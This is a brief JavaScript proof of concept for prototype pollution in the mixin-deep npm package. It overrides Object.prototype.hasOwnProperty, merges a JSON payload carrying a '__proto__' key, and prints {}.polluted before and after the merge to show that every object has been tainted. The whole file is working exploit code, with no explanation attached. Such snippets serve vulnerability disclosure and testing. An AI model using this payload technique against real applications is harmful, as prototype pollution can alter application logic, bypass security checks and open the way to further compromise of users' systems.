Object.prototype.hasOwnProperty = () => true;
const mixin = require('mixin-deep');
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
let obj = {};
console.log({}.polluted);
mixin({}, JSON.parse(malicious_payload));
console.log({}.polluted);